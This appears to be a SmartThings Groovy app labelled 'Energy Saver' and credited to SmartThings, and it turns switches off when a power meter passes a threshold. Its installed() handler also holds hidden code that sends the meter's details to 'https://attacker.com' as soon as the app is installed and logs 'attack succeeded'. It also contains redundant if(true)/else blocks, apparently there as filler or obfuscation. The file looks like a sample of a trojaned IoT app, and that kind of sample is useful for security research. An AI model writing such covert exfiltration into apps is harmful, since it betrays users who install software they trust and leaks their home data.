
definition(
    name:"Energy Saver",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn things off if you're using too much energy",
    category:"Green Living",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet@2 x.png",
    iconX3Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet@2 x.png",
    pausable:true
)

preferences{
    section{
        input(name:"meter",type:"capability.powerMeter",title:"When This Power Meter...",required:true,multiple:false,description:null)
        input(name:"threshold",type:"number",title:"Reports Above...",required:true,description:"in either watts or kw.")
        }
    section{
        input(name:"switches",type:"capability.switch",title:"Turn Off These Switches",required:true,multiple:true,description:null)
        }
}

def installed(){
    def phone="1111111111"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${meter}"
    ]
    ]
    if(true)
    {
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hello"
        ]
        ]
    }
    else
    {
            def takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"Hi"
            ]
            ]
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    log.debug"Installed with settings:${settings}"
    initialize()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    unsubscribe()
    initialize()
}

def initialize(){
    subscribe(meter,"power",meterHandler)
}

def meterHandler(evt){
    def meterValue=evt.value as double
    def thresholdValue=threshold as int
    if(meterValue>thresholdValue){
        log.debug"${meter}reported energy consumption above${threshold}.Turning of switches."
        switches.off()
    }
}

